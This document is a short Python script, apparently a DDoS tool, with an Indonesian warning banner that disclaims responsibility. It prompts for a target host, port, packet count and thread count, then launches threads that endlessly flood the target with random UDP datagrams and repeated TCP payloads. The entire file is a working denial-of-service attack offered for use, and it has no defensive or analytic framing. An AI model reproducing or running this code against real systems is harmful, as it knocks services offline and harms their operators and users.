import random
import socket
import threading
import os,sys
import time

os.system('clear')
print("""\033[91m
#=======================================#
|              WARNING!!!!              |
|              XC TEAM!!!!              |
|Ddos Attack Adalah Hal Ilegal Buat Yang|
|Kalau Kalian Pakek Tool Ini Buat Ddos  |
|Tanggung Sendiri Kalau Ada Pihak Yang  |
|Tidak Terima Jangan Sampai Kalian      |
|Menyangkutkan Pihak Kami..             |
#=======================================#""")
time.sleep(5)
os.system("clear")
print("""\033[91m████████████████████████""")
print("""\033[91m████████████████████████""")
print("""\033[91m████████████████████████""")
print("""\033[0m████████████████████████""")
print("""\033[0m████████████████████████""")
print("""\033[0m████████████████████████""")


ip = str(input("HOST/IP TARGET: "))
port = int(input("PORT TARGET: "))
times = int(input("PACKETS: "))
threads = int(input("THREADS: "))

os.system('clear')
def JembodDdos():
        data = random._urandom(2910)
        i = random.choice(("\033[93m[@] ","\033[93m[@] ","\033[93m[@] "))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        addr = (str(ip),int(port))
                        for x in range(times):
                                s.sendto(data,addr)
                        print(i +"\033[91mATTACK IP \033[0m%s \033[91mPORT \033[0m%s"%(ip, port))
                except:
                        print("\033[91m[~] YAH KENDOS DEKKKKKG!!!")

def JembodDdos2():
        data = random._urandom(1329)
        i = random.choice(("\033[93m[@] ","\033[93m[@] ","\033[93m[@] "))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip,port))
                        s.send(data)
                        for x in range(times):
                                s.send(data)
                        print(i +"\033[91mATTACK IP \033[0m%s \033[91mPORT \033[0m%s"%(ip, port))
                except:
                        s.close()
                        print("\033[91m[~] YAH KENDOS DEKKKKKG!!!")

def JembodDdos3():
        data = random._urandom(1912)
        i = random.choice(("\033[93m[@] ","\033[93m[@] ","\033[93m[@] "))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip,port))
                        s.send(data)
                        for x in range(times):
                                s.send(data)
                        print(i +"\033[91mATTACK IP \033[0m%s \033[91mPORT \033[0m%s"%(ip, port))
                except:
                        s.close()
                        print("\033[91m[~] YAH KENDOS DEKKKKKG!!!")


def JembodDdos4():
        data = random._urandom(1898)
        i = random.choice(("\033[93m[@] ","\033[93m[@] ","\033[93m[@] "))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip,port))
                        s.send(data)
                        for x in range(times):
                                s.send(data)
                        print(i +"\033[91mATTACK IP \033[0m%s \033[91mPORT \033[0m%s"%(ip, port))
                except:
                        s.close()
                        print("\033[91m[~] YAH KENDOS DEKKKKKG!!!")

for y in range(threads):
                th = threading.Thread(target = JembodDdos)
                th.start()
                th = threading.Thread(target = JembodDdos2)
                th.start()
                th = threading.Thread(target = JembodDdos3)
                th.start()
                th = threading.Thread(target = JembodDdos4)
                th.start()